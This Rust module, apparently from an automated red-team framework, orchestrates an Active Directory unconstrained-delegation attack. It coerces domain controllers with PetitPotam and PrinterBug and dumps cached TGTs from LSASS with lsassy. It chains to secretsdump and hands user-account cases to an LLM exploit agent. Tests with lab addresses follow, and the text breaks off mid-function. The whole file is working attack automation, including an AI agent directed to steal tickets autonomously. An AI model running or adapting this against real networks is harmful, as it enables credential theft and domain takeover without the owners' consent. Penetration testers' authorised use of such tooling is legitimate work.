//! auto_unconstrained_exploitation -- coerce-and-dump for unconstrained delegation.
//!
//! When a machine account with unconstrained delegation is discovered (e.g.
//! `DC02$`), this automation orchestrates the full attack chain:
//!
//!   1. **Coerce** a DC to authenticate to the unconstrained delegation host
//!      (PetitPotam / PrinterBug). The DC's TGT is cached in LSASS on that host.
//!   2. **Dump** cached TGTs from the host's LSASS memory via lsassy.
//!   3. **Chain** — result_processing's `auto_chain_s4u_secretsdump` picks up any
//!      `.ccache` ticket and dispatches secretsdump automatically.
//!
//! User accounts with unconstrained delegation (e.g. `sarah.connor`) are left to
//! the LLM-driven exploit path since we can't determine the target host.

use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use std::time::Duration;

use serde_json::{json, Value};
use tokio::sync::watch;
use tokio::time::Instant;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::{StateInner, DEDUP_COERCED_DCS};

/// Delay after coercion before dispatching the first TGT dump, giving the
/// coerced authentication time to complete and the TGT to land in LSASS.
const COERCE_TO_DUMP_DELAY: Duration = Duration::from_secs(15);

/// Maximum TGT dump attempts per vulnerability before giving up.
const MAX_DUMP_ATTEMPTS: u32 = 3;

/// Delay between successive dump retries for the same vuln.
const DUMP_RETRY_DELAY: Duration = Duration::from_secs(60);

/// True when an unconstrained-delegation machine host coincides with the
/// DC we'd coerce *from* — the coerce-and-capture chain requires the DC
/// to authenticate to a *different* unconstrained host whose LSASS we
/// then dump for the captured TGT. When they're the same machine both
/// PetitPotam (self-loop returns rpc_s_access_denied) and PrinterBug
/// (ERROR_INVALID_HANDLE) fail, and even a successful self-coerce would
/// require local admin on the DC — at which point dc_secretsdump is the
/// canonical exploitation path. Emits a debug log explaining why the
/// chain was skipped so the operator can distinguish "subsumed by
/// dc_secretsdump" (we already own the domain) from "deferring (no
/// self-coerce path)" (we don't).
///
/// User accounts (no trailing `$`) never trigger this skip — for them we
/// route to the LLM exploit path regardless.
fn skip_self_coerce_loop(
    vuln_id: &str,
    is_machine: bool,
    dc_ip: Option<&str>,
    host_ip: &str,
    domain_lc: &str,
    dominated_domains: &HashSet<String>,
) -> bool {
    if !is_machine {
        return false;
    }
    if dc_ip.is_none_or(|ip| ip != host_ip) {
        return false;
    }
    if dominated_domains.contains(domain_lc) {
        debug!(
            vuln_id = %vuln_id,
            host = %host_ip,
            "Unconstrained delegation host == DC — subsumed by dc_secretsdump"
        );
    } else {
        debug!(
            vuln_id = %vuln_id,
            host = %host_ip,
            "Unconstrained delegation host == DC — deferring (no self-coerce path)"
        );
    }
    true
}

// Phase tracking (in-memory only — intentionally not persisted so restarts
// re-trigger the chain, since cached TGTs expire quickly).
#[derive(Debug)]
pub(crate) struct PhaseState {
    pub coercion_dispatched_at: Option<Instant>,
    pub dump_attempts: u32,
    pub last_dump_at: Option<Instant>,
    pub completed: bool,
}

/// Look up the IP of the unconstrained-delegation machine account by
/// matching its trailing-`$` prefix against `state.hosts`. Returns `None`
/// when no host has a matching short hostname or FQDN.
///
/// Extracted so the prefix-vs-FQDN match (and the "must not match a
/// longer-name host" guard — e.g. `DC01$` must not match `dc011`) can
/// be tested directly.
pub(crate) fn find_host_ip_for_machine_account(
    state: &StateInner,
    account_name: &str,
) -> Option<String> {
    let prefix = account_name.trim_end_matches('$').to_lowercase();
    state.hosts.iter().find_map(|h| {
        let h_lower = h.hostname.to_lowercase();
        if h_lower == prefix || h_lower.starts_with(&format!("{prefix}.")) {
            Some(h.ip.clone())
        } else {
            None
        }
    })
}

/// Select unconstrained-delegation work items to dispatch this tick.
///
/// The phase-state state machine (no phase → Coerce or Dump, post-coercion
/// delay → Dump, post-dump retry cap & cooldown) is isolated here so it can
/// be unit-tested without a Dispatcher.
pub(crate) fn select_unconstrained_work_items(
    state: &StateInner,
    phases: &HashMap<String, PhaseState>,
    now: Instant,
) -> Vec<UnconstrainedWork> {
    state
        .discovered_vulnerabilities
        .values()
        .filter_map(|vuln| {
            if vuln.vuln_type.to_lowercase() != "unconstrained_delegation" {
                return None;
            }
            if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                return None;
            }

            let account_name = vuln
                .details
                .get("account_name")
                .and_then(|v| v.as_str())?
                .to_string();

            let domain = vuln
                .details
                .get("domain")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();

            if phases.get(&vuln.vuln_id).is_some_and(|p| p.completed) {
                return None;
            }

            let is_machine = account_name.ends_with('$');

            let dc_ip = state
                .domain_controllers
                .get(&domain.to_lowercase())
                .cloned();

            // Machine-account host resolution: ideally we match the SAM
            // account to a host in state.hosts so the deterministic coerce
            // → lsassy-dump chain has a target. When the host wasn't
            // scanned (LDAP enumeration finds the computer account but
            // nmap missed the IP — observed in a live op for a machine
            // with unconstrained delegation), the resolved_host_ip stays
            // None and we route to the LLM-exploit fallback below instead
            // of silently dropping the vuln. The LLM gets the account name
            // + domain and can dig out the IP via adidnsdump / dig /
            // authenticated ldap search, then run the exploit.
            let resolved_host_ip = if is_machine {
                find_host_ip_for_machine_account(state, &account_name)
            } else {
                None
            };
            let machine_host_unknown = is_machine && resolved_host_ip.is_none();

            // For the LlmExploit fallback paths (user accounts AND
            // unknown-host machines), use dc_ip as the stand-in target so
            // the payload builder has something non-empty to ship. Drop
            // the work if dc_ip is also missing (orchestrator hasn't
            // promoted any DC for this domain yet).
            let host_ip = if is_machine && !machine_host_unknown {
                resolved_host_ip.expect("checked machine_host_unknown == false")
            } else {
                dc_ip.as_ref().cloned()?
            };

            // Credentials gate applies to both deterministic and
            // LLM-fallback paths — without a working cred for the
            // account's domain neither variant can authenticate.
            let credential = state
                .credentials
                .iter()
                .find(|c| {
                    !c.password.is_empty()
                        && c.domain.to_lowercase() == domain.to_lowercase()
                        && !state.is_principal_quarantined(&c.username, &c.domain)
                })
                .cloned();

            credential.as_ref()?;

            // User accounts: always LLM-routed (the user's TGT lives on
            // their workstation, not on the DC; the LLM has to find a
            // host where the user is logged in and pull their TGT).
            if !is_machine {
                let dedup_key = format!("uc_user:{}", account_name.to_lowercase());
                return Some(UnconstrainedWork {
                    vuln_id: vuln.vuln_id.clone(),
                    account_name,
                    domain,
                    host_ip,
                    dc_ip,
                    credential,
                    action: Action::LlmExploit,
                    _dedup_key: Some(dedup_key),
                });
            }

            // Machine account with no known host IP: route to LLM exploit
            // with a distinct dedup key so it doesn't collide with user
            // LlmExploit work and doesn't compete with the resolved-host
            // coerce-dump phases. The skip_self_coerce_loop check below is
            // intentionally bypassed — that guard only applies to the
            // deterministic coerce path against a machine whose host IS in
            // state.hosts and happens to coincide with the DC. The
            // LLM-fallback path treats dc_ip as a starting hint, not as
            // the coerce-loopback target.
            if machine_host_unknown {
                let dedup_key = format!("uc_machine_unknown:{}", account_name.to_lowercase());
                return Some(UnconstrainedWork {
                    vuln_id: vuln.vuln_id.clone(),
                    account_name,
                    domain,
                    host_ip,
                    dc_ip,
                    credential,
                    action: Action::LlmExploit,
                    _dedup_key: Some(dedup_key),
                });
            }

            // Resolved-host machine: gated by the self-coerce loop check
            // (don't coerce a host back to itself when host == dc_ip).
            if skip_self_coerce_loop(
                &vuln.vuln_id,
                is_machine,
                dc_ip.as_deref(),
                &host_ip,
                &domain.to_lowercase(),
                &state.dominated_domains,
            ) {
                return None;
            }

            let phase = phases.get(&vuln.vuln_id);
            let already_coerced = dc_ip
                .as_ref()
                .is_some_and(|ip| state.is_processed(DEDUP_COERCED_DCS, ip));

            let action = match phase {
                None if already_coerced => Action::Dump,
                None if dc_ip.is_some() => Action::Coerce,
                None => return None,

                Some(p)
                    if p.coercion_dispatched_at.is_some()
                        && p.dump_attempts == 0
                        && now.duration_since(p.coercion_dispatched_at.unwrap())
                            >= COERCE_TO_DUMP_DELAY =>
                {
                    Action::Dump
                }

                Some(p)
                    if p.dump_attempts > 0
                        && p.dump_attempts < MAX_DUMP_ATTEMPTS
                        && p.last_dump_at
                            .is_none_or(|t| now.duration_since(t) >= DUMP_RETRY_DELAY) =>
                {
                    Action::Dump
                }

                _ => return None,
            };

            Some(UnconstrainedWork {
                vuln_id: vuln.vuln_id.clone(),
                account_name,
                domain,
                host_ip,
                dc_ip,
                credential,
                action,
                _dedup_key: None,
            })
        })
        .collect()
}

/// Build the coerce-DC-to-host payload for the `coercion` queue. Pure JSON
/// construction. Caller must ensure `item.credential` and `item.dc_ip` are
/// `Some(_)` — both are panic-free for `None` (returns `Value::Null`).
pub(crate) fn build_unconstrained_coerce_payload(item: &UnconstrainedWork) -> Value {
    let Some(dc_ip) = item.dc_ip.as_ref() else {
        return Value::Null;
    };
    let Some(cred) = item.credential.as_ref() else {
        return Value::Null;
    };
    json!({
        "target_ip": dc_ip,
        "listener_ip": item.host_ip,
        "techniques": ["petitpotam", "printerbug"],
        "credential": {
            "username": cred.username,
            "password": cred.password,
            "domain": cred.domain,
        },
        "reason": "unconstrained_delegation_coercion",
    })
}

/// Build the LSASS-dump payload for the `exploit` queue. Pure JSON
/// construction; `Value::Null` when no credential is attached.
pub(crate) fn build_unconstrained_dump_payload(item: &UnconstrainedWork) -> Value {
    let Some(cred) = item.credential.as_ref() else {
        return Value::Null;
    };
    json!({
        "technique": "unconstrained_tgt_dump",
        "vuln_type": "unconstrained_delegation",
        "vuln_id": item.vuln_id,
        "target": item.host_ip,
        "target_ip": item.host_ip,
        "domain": item.domain,
        "account_name": item.account_name,
        "credential": {
            "username": cred.username,
            "password": cred.password,
            "domain": cred.domain,
        },
    })
}

/// Build the user-account LLM-exploit payload (for non-machine principals).
/// Pure JSON construction; `Value::Null` when no credential is attached.
pub(crate) fn build_unconstrained_llm_exploit_payload(item: &UnconstrainedWork) -> Value {
    let Some(cred) = item.credential.as_ref() else {
        return Value::Null;
    };
    json!({
        "technique": "unconstrained_delegation_exploit",
        "vuln_type": "unconstrained_delegation",
        "vuln_id": item.vuln_id,
        "target": item.host_ip,
        "target_ip": item.host_ip,
        "domain": item.domain,
        "account_name": item.account_name,
        "is_user_account": true,
        "credential": {
            "username": cred.username,
            "password": cred.password,
            "domain": cred.domain,
        },
    })
}

/// Monitors for unconstrained delegation vulns and orchestrates coerce → dump.
/// Interval: 20s. Wakes on delegation_notify and credential_access_notify.
pub async fn auto_unconstrained_exploitation(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let deleg_notify = dispatcher.delegation_notify.clone();
    let cred_notify = dispatcher.credential_access_notify.clone();
    let mut interval = tokio::time::interval(Duration::from_secs(20));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    let mut phases: HashMap<String, PhaseState> = HashMap::new();

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = deleg_notify.notified() => {},
            _ = cred_notify.notified() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let work: Vec<UnconstrainedWork> = {
            let state = dispatcher.state.read().await;

            // Skip only when ALL forests are dominated AND strategy says to stop.
            // When continue_after_da is true, keep exploiting unconstrained
            // delegation for path diversity even after full domination.
            if state.has_domain_admin
                && state.all_forests_dominated()
                && !dispatcher.config.strategy.should_continue_after_da()
            {
                continue;
            }

            select_unconstrained_work_items(&state, &phases, Instant::now())
        };

        for item in work {
            match item.action {
                Action::Coerce => {
                    if item.dc_ip.is_none() || item.credential.is_none() {
                        continue;
                    }
                    let dc_ip = item.dc_ip.as_ref().unwrap().clone();
                    let payload = build_unconstrained_coerce_payload(&item);

                    let priority = dispatcher.effective_priority("unconstrained_delegation");
                    match dispatcher
                        .throttled_submit("coercion", "coercion", payload, priority)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            info!(
                                task_id = %task_id,
                                vuln_id = %item.vuln_id,
                                account = %item.account_name,
                                dc = %dc_ip,
                                listener = %item.host_ip,
                                "Unconstrained delegation: coercion dispatched (DC → host)"
                            );
                            phases.insert(
                                item.vuln_id.clone(),
                                PhaseState {
                                    coercion_dispatched_at: Some(Instant::now()),
                                    dump_attempts: 0,
                                    last_dump_at: None,
                                    completed: false,
                                },
                            );
                        }
                        Ok(None) => {
                            debug!(vuln_id = %item.vuln_id, "Coercion deferred by throttler");
                        }
                        Err(e) => {
                            warn!(
                                err = %e,
                                vuln_id = %item.vuln_id,
                                "Failed to dispatch unconstrained coercion"
                            );
                        }
                    }
                }

                Action::Dump => {
                    if item.credential.is_none() {
                        continue;
                    }
                    let payload = build_unconstrained_dump_payload(&item);

                    let priority = dispatcher.effective_priority("unconstrained_delegation");
                    match dispatcher
                        .throttled_submit("exploit", "privesc", payload, priority)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            let phase = phases.entry(item.vuln_id.clone()).or_insert(PhaseState {
                                coercion_dispatched_at: None,
                                dump_attempts: 0,
                                last_dump_at: None,
                                completed: false,
                            });
                            phase.dump_attempts += 1;
                            phase.last_dump_at = Some(Instant::now());

                            info!(
                                task_id = %task_id,
                                vuln_id = %item.vuln_id,
                                attempt = phase.dump_attempts,
                                target = %item.host_ip,
                                "Unconstrained delegation: TGT dump dispatched"
                            );

                            if phase.dump_attempts >= MAX_DUMP_ATTEMPTS {
                                phase.completed = true;
                                debug!(
                                    vuln_id = %item.vuln_id,
                                    "Unconstrained delegation: max dump attempts reached"
                                );
                            }
                        }
                        Ok(None) => {
                            debug!(vuln_id = %item.vuln_id, "TGT dump deferred by throttler");
                        }
                        Err(e) => {
                            warn!(
                                err = %e,
                                vuln_id = %item.vuln_id,
                                "Failed to dispatch TGT dump"
                            );
                        }
                    }
                }

                Action::LlmExploit => {
                    if item.credential.is_none() {
                        continue;
                    }
                    let payload = build_unconstrained_llm_exploit_payload(&item);

                    let priority = dispatcher.effective_priority("unconstrained_delegation");
                    match dispatcher
                        .throttled_submit("exploit", "privesc", payload, priority)
                        .await
                    {
                        Ok(Some(task_id)) => {
                            info!(
                                task_id = %task_id,
                                vuln_id = %item.vuln_id,
                                account = %item.account_name,
                                "Unconstrained delegation: LLM exploit dispatched (user account)"
                            );
                            phases.insert(
                                item.vuln_id.clone(),
                                PhaseState {
                                    coercion_dispatched_at: None,
                                    dump_attempts: 0,
                                    last_dump_at: None,
                                    completed: true,
                                },
                            );
                        }
                        Ok(None) => {
                            debug!(vuln_id = %item.vuln_id, "LLM exploit deferred by throttler");
                        }
                        Err(e) => {
                            warn!(
                                err = %e,
                                vuln_id = %item.vuln_id,
                                "Failed to dispatch unconstrained LLM exploit"
                            );
                        }
                    }
                }
            }
        }
    }
}

#[derive(Debug, PartialEq, Eq)]
pub(crate) enum Action {
    Coerce,
    Dump,
    /// Dispatch to LLM exploit agent (for user accounts).
    LlmExploit,
}

pub(crate) struct UnconstrainedWork {
    pub vuln_id: String,
    pub account_name: String,
    pub domain: String,
    pub host_ip: String,
    pub dc_ip: Option<String>,
    pub credential: Option<ares_core::models::Credential>,
    pub action: Action,
    pub _dedup_key: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::Duration;
    use tokio::time::Instant;

    // hostname resolution logic

    /// Simulate the hostname resolution logic from the main function.
    fn resolve_host_ip(account_name: &str, hosts: &[(String, String)]) -> Option<String> {
        let hostname_prefix = account_name.trim_end_matches('$').to_lowercase();
        hosts.iter().find_map(|(hostname, ip)| {
            let h_lower = hostname.to_lowercase();
            if h_lower == hostname_prefix || h_lower.starts_with(&format!("{hostname_prefix}.")) {
                Some(ip.clone())
            } else {
                None
            }
        })
    }

    #[test]
    fn hostname_resolution_machine_account() {
        let account = "DC02$";
        let prefix = account.trim_end_matches('$').to_lowercase();
        assert_eq!(prefix, "dc02");

        let hostname = "dc02.child.contoso.local";
        let h_lower = hostname.to_lowercase();
        assert!(h_lower == prefix || h_lower.starts_with(&format!("{prefix}.")));
    }

    #[test]
    fn hostname_resolution_short_name() {
        let account = "DC01$";
        let prefix = account.trim_end_matches('$').to_lowercase();
        assert_eq!(prefix, "dc01");

        assert!("dc01" == prefix);
        assert!("dc01.contoso.local".starts_with(&format!("{prefix}.")));
        assert!(!"dc011.contoso.local".starts_with(&format!("{prefix}.")));
    }

    #[test]
    fn hostname_resolution_fqdn_match() {
        let hosts = vec![
            (
                "dc01.contoso.local".to_string(),
                "192.168.58.10".to_string(),
            ),
            (
                "sql01.contoso.local".to_string(),
                "192.168.58.20".to_string(),
            ),
        ];
        assert_eq!(
            resolve_host_ip("DC01$", &hosts),
            Some("192.168.58.10".to_string())
        );
    }

    #[test]
    fn hostname_resolution_short_hostname_match() {
        let hosts = vec![("dc01".to_string(), "192.168.58.10".to_string())];
        assert_eq!(
            resolve_host_ip("DC01$", &hosts),
            Some("192.168.58.10".to_string())
        );
    }

    #[test]
    fn hostname_resolution_no_match() {
        let hosts = vec![
            (
                "sql01.contoso.local".to_string(),
                "192.168.58.20".to_string(),
            ),
            (
                "web01.contoso.local".to_string(),
                "192.168.58.30".to_string(),
            ),
        ];
        assert_eq!(resolve_host_ip("DC01$", &hosts), None);
    }

    #[test]
    fn hostname_resolution_case_insensitive() {
        let hosts = vec![(
            "DC01.CONTOSO.LOCAL".to_string(),
            "192.168.58.10".to_string(),
        )];
        assert_eq!(
            resolve_host_ip("dc01$", &hosts),
            Some("192.168.58.10".to_string())
        );
    }

    #[test]
    fn hostname_resolution_prefix_not_substring() {
        // "dc01" should not match "dc011.contoso.local"
        let hosts = vec![(
            "dc011.contoso.local".to_string(),
            "192.168.58.11".to_string(),
        )];
        assert_eq!(resolve_host_ip("DC01$", &hosts), None);
    }

    #[test]
    fn hostname_resolution_multiple_domains() {
        let hosts = vec![
            (
                "dc01.contoso.local".to_string(),
                "192.168.58.10".to_string(),
            ),
            (
                "dc01.fabrikam.local".to_string(),
                "192.168.58.40".to_string(),
            ),
        ];
        // Returns first match
        assert_eq!(
            resolve_host_ip("DC01$", &hosts),
            Some("192.168.58.10".to_string())
        );
    }

    // is_machine_account

    #[test]
    fn is_machine_account() {
        assert!("DC02$".ends_with('$'));
        assert!("SQL01$".ends_with('$'));
        assert!("WEB01$".ends_with('$'));
        assert!(!"testuser".ends_with('$'));
        assert!(!"Administrator".ends_with('$'));
        assert!(!"svc_admin".ends_with('$'));
    }

    #[test]
    fn machine_account_prefix_extraction() {
        assert_eq!("DC01$".trim_end_matches('$').to_lowercase(), "dc01");
        assert_eq!("SQL01$".trim_end_matches('$').to_lowercase(), "sql01");
        assert_eq!("WEB-SRV$".trim_end_matches('$').to_lowercase(), "web-srv");
    }

    // user account handling

    #[test]
    fn user_account_gets_dc_ip_as_target() {
        let account = "testuser";
        let is_machine = account.ends_with('$');
        assert!(!is_machine);
    }

    // dedup key format

    #[test]
    fn dedup_key_format_user_account() {
        let account = "testuser";
        let dedup_key = format!("uc_user:{}", account.to_lowercase());
        assert_eq!(dedup_key, "uc_user:testuser");
    }

    #[test]
    fn dedup_key_case_normalized() {
        let key1 = format!("uc_user:{}", "TestUser".to_lowercase());
        let key2 = format!("uc_user:{}", "testuser".to_lowercase());
        assert_eq!(key1, key2);
    }

    #[test]
    fn dedup_key_unique_per_user() {
        let key1 = format!("uc_user:{}", "user1".to_lowercase());
        let key2 = format!("uc_user:{}", "user2".to_lowercase());
        assert_ne!(key1, key2);
    }

    // PhaseState

    #[test]
    fn phase_state_defaults() {
        let phase = PhaseState {
            coercion_dispatched_at: None,
            dump_attempts: 0,
            last_dump_at: None,
            completed: false,
        };
        assert!(!phase.completed);
        assert_eq!(phase.dump_attempts, 0);
        assert!(phase.coercion_dispatched_at.is_none());
        assert!(phase.last_dump_at.is_none());
    }

    #[test]
    fn phase_state_after_coercion() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: 0,
            last_dump_at: None,
            completed: false,
        };
        assert!(phase.coercion_dispatched_at.is_some());
        assert_eq!(phase.dump_attempts, 0);
        assert!(!phase.completed);
    }

    #[test]
    fn phase_state_after_first_dump() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: 1,
            last_dump_at: Some(Instant::now()),
            completed: false,
        };
        assert_eq!(phase.dump_attempts, 1);
        assert!(phase.last_dump_at.is_some());
        assert!(!phase.completed);
    }

    #[test]
    fn phase_state_max_attempts_reached() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: MAX_DUMP_ATTEMPTS,
            last_dump_at: Some(Instant::now()),
            completed: true,
        };
        assert!(phase.completed);
        assert_eq!(phase.dump_attempts, MAX_DUMP_ATTEMPTS);
    }

    #[test]
    fn phase_state_under_max_attempts() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: MAX_DUMP_ATTEMPTS - 1,
            last_dump_at: Some(Instant::now()),
            completed: false,
        };
        assert!(phase.dump_attempts < MAX_DUMP_ATTEMPTS);
        assert!(!phase.completed);
    }

    // Coercion timing logic

    #[test]
    fn coerce_to_dump_delay_not_elapsed() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: 0,
            last_dump_at: None,
            completed: false,
        };
        // Just created, delay has not elapsed
        let elapsed = phase.coercion_dispatched_at.unwrap().elapsed();
        assert!(elapsed < COERCE_TO_DUMP_DELAY);
    }

    // Dump retry timing logic

    #[test]
    fn dump_retry_eligible_no_last_dump() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: 1,
            last_dump_at: None,
            completed: false,
        };
        // With last_dump_at = None, retry should be eligible
        assert!(phase
            .last_dump_at
            .is_none_or(|t| t.elapsed() >= DUMP_RETRY_DELAY));
    }

    #[test]
    fn dump_retry_not_yet_eligible() {
        let phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: 1,
            last_dump_at: Some(Instant::now()),
            completed: false,
        };
        // Just dumped, retry delay has not elapsed
        let elapsed = phase.last_dump_at.unwrap().elapsed();
        assert!(elapsed < DUMP_RETRY_DELAY);
    }

    // Constants

    #[test]
    fn max_dump_attempts_constant() {
        assert_eq!(MAX_DUMP_ATTEMPTS, 3);
    }

    #[test]
    fn coerce_to_dump_delay() {
        assert_eq!(COERCE_TO_DUMP_DELAY, Duration::from_secs(15));
    }

    #[test]
    fn dump_retry_delay() {
        assert_eq!(DUMP_RETRY_DELAY, Duration::from_secs(60));
    }

    // Action enum

    #[test]
    fn action_debug_format() {
        assert_eq!(format!("{:?}", Action::Coerce), "Coerce");
        assert_eq!(format!("{:?}", Action::Dump), "Dump");
        assert_eq!(format!("{:?}", Action::LlmExploit), "LlmExploit");
    }

    // UnconstrainedWork construction patterns

    #[test]
    fn unconstrained_work_machine_coerce() {
        let work = UnconstrainedWork {
            vuln_id: "vuln-uc-001".to_string(),
            account_name: "DC02$".to_string(),
            domain: "contoso.local".to_string(),
            host_ip: "192.168.58.11".to_string(),
            dc_ip: Some("192.168.58.10".to_string()),
            credential: Some(ares_core::models::Credential {
                id: "cred-1".to_string(),
                username: "testuser".to_string(),
                password: "P@ssw0rd!".to_string(), // pragma: allowlist secret
                domain: "contoso.local".to_string(),
                source: String::new(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            }),
            action: Action::Coerce,
            _dedup_key: None,
        };

        assert!(work.account_name.ends_with('$'));
        assert!(work.dc_ip.is_some());
        assert!(work.credential.is_some());
        assert!(work._dedup_key.is_none());
        assert!(matches!(work.action, Action::Coerce));
    }

    #[test]
    fn unconstrained_work_machine_dump() {
        let work = UnconstrainedWork {
            vuln_id: "vuln-uc-002".to_string(),
            account_name: "SQL01$".to_string(),
            domain: "fabrikam.local".to_string(),
            host_ip: "192.168.58.21".to_string(),
            dc_ip: Some("192.168.58.20".to_string()),
            credential: Some(ares_core::models::Credential {
                id: "cred-2".to_string(),
                username: "testuser".to_string(),
                password: "P@ssw0rd!".to_string(), // pragma: allowlist secret
                domain: "fabrikam.local".to_string(),
                source: String::new(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            }),
            action: Action::Dump,
            _dedup_key: None,
        };

        assert!(matches!(work.action, Action::Dump));
        assert_eq!(work.host_ip, "192.168.58.21");
    }

    #[test]
    fn unconstrained_work_user_llm_exploit() {
        let work = UnconstrainedWork {
            vuln_id: "vuln-uc-003".to_string(),
            account_name: "svc_admin".to_string(),
            domain: "contoso.local".to_string(),
            host_ip: "192.168.58.10".to_string(), // DC IP used as target for user accounts
            dc_ip: Some("192.168.58.10".to_string()),
            credential: Some(ares_core::models::Credential {
                id: "cred-3".to_string(),
                username: "testuser".to_string(),
                password: "P@ssw0rd!".to_string(), // pragma: allowlist secret
                domain: "contoso.local".to_string(),
                source: String::new(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            }),
            action: Action::LlmExploit,
            _dedup_key: Some("uc_user:svc_admin".to_string()),
        };

        assert!(!work.account_name.ends_with('$'));
        assert!(matches!(work.action, Action::LlmExploit));
        assert_eq!(
            work._dedup_key.as_ref().expect("dedup key should be set"),
            "uc_user:svc_admin"
        );
        // For user accounts, host_ip matches dc_ip
        assert_eq!(work.host_ip, work.dc_ip.as_ref().unwrap().as_str());
    }

    // Phase state machine transitions

    #[test]
    fn phase_transition_none_to_coerce() {
        // When no phase exists and DC is available, action should be Coerce
        let mut phases: HashMap<String, PhaseState> = HashMap::new();
        let vuln_id = "vuln-001";
        let dc_ip = Some("192.168.58.10".to_string());
        let already_coerced = false;

        let phase = phases.get(vuln_id);
        let action = match phase {
            None if already_coerced => Action::Dump,
            None if dc_ip.is_some() => Action::Coerce,
            _ => Action::Dump, // fallback for test
        };

        assert!(matches!(action, Action::Coerce));

        // After coercion, insert phase state
        phases.insert(
            vuln_id.to_string(),
            PhaseState {
                coercion_dispatched_at: Some(Instant::now()),
                dump_attempts: 0,
                last_dump_at: None,
                completed: false,
            },
        );
        assert!(phases.contains_key(vuln_id));
    }

    #[test]
    fn phase_transition_already_coerced_skips_to_dump() {
        let phases: HashMap<String, PhaseState> = HashMap::new();
        let vuln_id = "vuln-002";
        let dc_ip = Some("192.168.58.10".to_string());
        let already_coerced = true;

        let phase = phases.get(vuln_id);
        let action = match phase {
            None if already_coerced => Action::Dump,
            None if dc_ip.is_some() => Action::Coerce,
            _ => Action::Coerce, // fallback for test
        };

        assert!(matches!(action, Action::Dump));
    }

    #[test]
    fn phase_dump_increments_attempts() {
        let mut phase = PhaseState {
            coercion_dispatched_at: Some(Instant::now()),
            dump_attempts: 0,
            last_dump_at: None,
            completed: false,
        };

        // Simulate dump dispatch
        phase.dump_attempts += 1;
        phase.last_dump_at = Some(Instant::now());
        assert_eq!(phase.dump_attempts, 1);

        // Second dump
        phase.dump_attempts += 1;
        phase.last_dump_at = Some(Instant::now());
        assert_eq!(phase.dump_attempts, 2);

        // Third dump (max)
        phase.dump_attempts += 1;
        phase.last_dump_at = Some(Instant::now());
        if phase.dump_attempts >= MAX_DUMP_ATTEMPTS {
            phase.completed = true;
        }
        assert_eq!(phase.dump_attempts, 3);
        assert!(phase.completed);
    }

    #[test]
    fn phase_llm_exploit_immediately_completed() {
        let phase = PhaseState {
            coercion_dispatched_at: None,
            dump_attempts: 0,
            last_dump_at: None,
            completed: true,
        };
        // LLM exploit phases are marked completed immediately
        assert!(phase.completed);
        assert!(phase.coercion_dispatched_at.is_none());
        assert_eq!(phase.dump_attempts, 0);
    }

    // skip_self_coerce_loop

    #[test]
    fn skip_self_coerce_loop_user_account_never_skips() {
        let dominated = HashSet::new();
        // is_machine = false → always returns false regardless of IP overlap.
        assert!(!skip_self_coerce_loop(
            "vuln-1",
            false,
            Some("192.168.58.10"),
            "192.168.58.10",
            "contoso.local",
            &dominated,
        ));
    }

    #[test]
    fn skip_self_coerce_loop_no_dc_ip_no_skip() {
        let dominated = HashSet::new();
        assert!(!skip_self_coerce_loop(
            "vuln-1",
            true,
            None,
            "192.168.58.10",
            "contoso.local",
            &dominated,
        ));
    }

    #[test]
    fn skip_self_coerce_loop_distinct_dc_no_skip() {
        let dominated = HashSet::new();
        // DC and unconstrained host are different machines — the chain is
        // viable, so we don't skip.
        assert!(!skip_self_coerce_loop(
            "vuln-1",
            true,
            Some("192.168.58.10"),
            "192.168.58.20",
            "contoso.local",
            &dominated,
        ));
    }

    #[test]
    fn skip_self_coerce_loop_dc_equals_host_skips_when_dominated() {
        let mut dominated = HashSet::new();
        dominated.insert("contoso.local".to_string());
        // host == DC AND domain already dominated → skip (subsumed by
        // dc_secretsdump).
        assert!(skip_self_coerce_loop(
            "vuln-1",
            true,
            Some("192.168.58.10"),
            "192.168.58.10",
            "contoso.local",
            &dominated,
        ));
    }

    #[test]
    fn skip_self_coerce_loop_dc_equals_host_skips_when_not_dominated() {
        let dominated = HashSet::new();
        // host == DC and domain NOT dominated → still skip, but the debug
        // log explains it's a defer (no self-coerce path) rather than a
        // subsumption.
        assert!(skip_self_coerce_loop(
            "vuln-1",
            true,
            Some("192.168.58.10"),
            "192.168.58.10",
            "contoso.local",
            &dominated,
        ));
    }

    #[test]
    fn skip_self_coerce_loop_dominance_check_is_case_sensitive_on_input() {
        // Caller is responsible for lowercasing the domain before passing it
        // in — the helper compares with the dominated_domains set as-is.
        let mut dominated = HashSet::new();
        dominated.insert("contoso.local".to_string());
        // Lowercase input matches → skip path.
        assert!(skip_self_coerce_loop(
            "vuln-1",
            true,
            Some("192.168.58.10"),
            "192.168.58.10",
            "contoso.local",
            &dominated,
        ));
        // Uppercase input does NOT match — but skip still fires because
        // host == DC; only the log branch differs.
        assert!(skip_self_coerce_loop(
            "vuln-1",
            true,
            Some("192.168.58.10"),
            "192.168.58.10",
            "CONTOSO.LOCAL",
            &dominated,
        ));
    }

    // ── helpers for select_unconstrained_work_items / payload builder tests ──

    fn make_cred(user: &str, password: &str, domain: &str) -> ares_core::models::Credential {
        ares_core::models::Credential {
